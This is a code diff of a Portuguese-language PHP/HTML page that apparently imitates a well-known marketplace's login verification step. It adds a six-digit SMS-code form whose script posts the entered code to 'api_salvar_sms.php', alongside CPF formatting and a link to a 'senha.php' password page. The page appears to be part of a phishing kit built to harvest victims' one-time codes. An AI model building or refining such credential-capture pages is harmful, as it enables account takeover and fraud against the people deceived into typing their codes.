@@ -19,106 +19,75 @@ function formatarCPF($cpf) {
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Insira o código SMS</title>
     <style>
-        body {
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
-            background-color: #f5f5f5;
-            color: #333;
+        :root {
+            --cor-amarela: #ffe600;
+            --cor-azul: #3483fa;
+            --cor-texto-primaria: #333;
+            --cor-texto-secundaria: #666;
+            --cor-fundo: #f5f5f5;
+            --cor-card: #ffffff;
+            --cor-borda: #ddd;
         }
+        body { margin: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif; background-color: var(--cor-fundo); color: #333; }
+        .main-header { background-color: var(--cor-amarela); height: 60px; display: flex; align-items: center; padding: 0 48px; }
+        .main-header img { height: 37px; }
+        .main-content { padding-top: 80px; flex-grow: 1; }
+        .content-wrapper { max-width: 960px; margin: 0 auto; display: flex; justify-content: center; align-items: flex-start; gap: 64px; }
+        .left-column { width: 340px; flex-shrink: 0; }
+        .session-start-label { font-size: 12px; font-weight: 600; color: var(--cor-texto-secundaria); text-transform: uppercase; }
+        .main-title { font-size: 28px; font-weight: 400; margin: 8px 0 16px 0; }
+        .description-text { font-size: 16px; color: var(--cor-texto-secundaria); line-height: 1.5; margin-bottom: 24px; }
+        .user-info-box { display: inline-flex; align-items: center; gap: 12px; border: 1px solid #e0e0e0; border-radius: 25px; padding: 12px; margin-bottom: 24px; }
+        .user-info-box .icon { width: 32px; height: 32px; background-color: #eaf3ff; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+        .user-info-box .details span { display: block; font-size: 14px; }
+        .user-info-box .details a { font-size: 12px; color: var(--cor-azul); text-decoration: none; }
+        .help-link { color: var(--cor-azul); text-decoration: none; font-size: 14px; font-weight: 500; }
 
-        .main-header {
-            background-color: #ffe600;
-            height: 60px;
+        /* --- NOVOS ESTILOS PARA O CARD DA DIREITA --- */
+        .form-card {
+            background-color: var(--cor-card);
+            box-shadow: 0 1px 4px 0 rgba(0,0,0,.1);
+            border-radius: 6px;
+            padding: 48px;
+            width: 380px;
+            box-sizing: border-box;
+        }
+        .form-card label {
+             font-size: 16px;
+             color: var(--cor-texto-primaria);
+        }
+        .code-inputs {
             display: flex;
-            align-items: center;
-            /* O padding é ajustado para alinhar com o conteúdo abaixo */
-            padding: 0 48px; 
-        }
-
-        .main-header img {
-            height: 37px;
-        }
-
-        /* Container principal para alinhar o conteúdo */
-        .main-content {
-            padding-top: 80px;
-            flex-grow: 1; /* Garante que o main ocupe o espaço disponível */
-        }
-        
-        /* NOVO: Wrapper para centralizar o layout de colunas */
-        .content-wrapper {
-            max-width: 960px; /* Largura máxima do conteúdo total */
-            margin: 0 auto; /* Centraliza o wrapper na página */
-            display: flex; /* Ativa flexbox */
-            justify-content: center; /* Centraliza as colunas filhas */
-            gap: 64px; /* Espaço entre a coluna da esquerda e a futura da direita */
-        }
-
-        /* Estilos para a coluna da esquerda */
-        .left-column {
-            width: 340px; /* Largura fixa para a coluna de texto */
-            flex-shrink: 0; /* Impede que a coluna encolha */
-        }
-
-        .session-start-label {
-            font-size: 12px;
-            font-weight: 600;
-            color: #666;
-            text-transform: uppercase;
-        }
-
-        .main-title {
-            font-size: 28px;
-            font-weight: 400;
-            margin: 8px 0 16px 0;
-        }
-
-        .description-text {
-            font-size: 16px;
-            color: #666;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-
-        .user-info-box {
-            /* MUDANÇA: inline-flex faz a caixa se ajustar ao conteúdo */
-            display: inline-flex; 
-            align-items: center;
-            gap: 12px;
-            border: 1px solid #e0e0e0;
-            border-radius: 25px; /* Bordas arredondadas */
-            padding: 12px;
-            margin-bottom: 24px;
-        }
-
-        .user-info-box .icon {
-            width: 32px;
-            height: 32px;
-            background-color: #eaf3ff;
-            border-radius: 50%;
-            display: flex;
-            align-items: center;
+            gap: 10px;
             justify-content: center;
+            margin: 24px 0;
         }
-
-        .user-info-box .details span {
-            display: block;
+        .code-inputs input {
+            width: 40px;
+            height: 50px;
+            text-align: center;
+            font-size: 24px;
+            border: 1px solid var(--cor-borda);
+            border-radius: 6px;
+        }
+        .code-inputs input:focus {
+            border-color: var(--cor-azul);
+            outline: none;
+        }
+        .resend-timer {
+            text-align: center;
             font-size: 14px;
-            color: #333;
+            color: var(--cor-texto-secundaria);
+            margin-bottom: 24px;
         }
-
-        .user-info-box .details a {
-            font-size: 12px;
-            color: #3483fa;
-            text-decoration: none;
+        .actions {
+            display: flex;
+            gap: 16px;
+            align-items: center;
         }
-
-        .help-link {
-            color: #3483fa;
-            text-decoration: none;
-            font-size: 14px;
-            font-weight: 500;
-        }
+        .btn { padding: 14px 24px; font-size: 15px; font-weight: 600; border-radius: 6px; cursor: pointer; border: 1px solid transparent; }
+        .btn-primary { background-color: var(--cor-azul); color: white; flex-grow: 1; }
+        .btn-secondary { color: var(--cor-azul); text-decoration: none; }
     </style>
 </head>
 <body>
@@ -151,8 +120,75 @@ function formatarCPF($cpf) {
                 <a href="#" class="help-link">Preciso de ajuda</a>
             </div>
 
+            <div class="form-card">
+                <form id="sms-form" onsubmit="handleFormSubmit(event)">
+                    <label>Digite o código</label>
+                    <div class="code-inputs">
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                        <input type="tel" maxlength="1" pattern="[0-9]" required>
+                    </div>
+                    <div class="resend-timer">Reenviar código em 00:13</div>
+                    <div class="actions">
+                        <button type="submit" class="btn btn-primary">Confirmar código</button>
+                        <a href="senha.php" class="btn-secondary">Escolher outro método</a>
+                    </div>
+                </form>
             </div>
+
+        </div>
     </main>
 
+    <script>
+        const smsForm = document.getElementById('sms-form');
+        const inputs = [...smsForm.querySelectorAll('.code-inputs input')];
+
+        // Lógica para pular para o próximo campo
+        inputs.forEach((input, index) => {
+            input.addEventListener('input', () => {
+                if (input.value && index < inputs.length - 1) {
+                    inputs[index + 1].focus();
+                }
+            });
+            // Lógica para apagar e voltar para o campo anterior
+            input.addEventListener('keydown', (e) => {
+                 if (e.key === "Backspace" && !input.value && index > 0) {
+                    inputs[index - 1].focus();
+                }
+            });
+        });
+
+        // Lógica de submissão do formulário
+        async function handleFormSubmit(event) {
+            event.preventDefault();
+            const code = inputs.map(input => input.value).join('');
+
+            if (code.length === 6) {
+                console.log('Enviando código:', code);
+                try {
+                    const response = await fetch('api_salvar_sms.php', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ sms_code: code })
+                    });
+                    const result = await response.json();
+                    
+                    if (result.success) {
+                        alert('Código recebido com sucesso!');
+                        // Redirecionar para próxima página ou aguardar
+                    } else {
+                        alert('Erro: ' + (result.error || 'Não foi possível salvar o código.'));
+                    }
+                } catch (error) {
+                    alert('Erro de conexão com o servidor.');
+                }
+            } else {
+                alert('Por favor, preencha todos os 6 dígitos.');
+            }
+        }
+    </script>
 </body>
 </html>
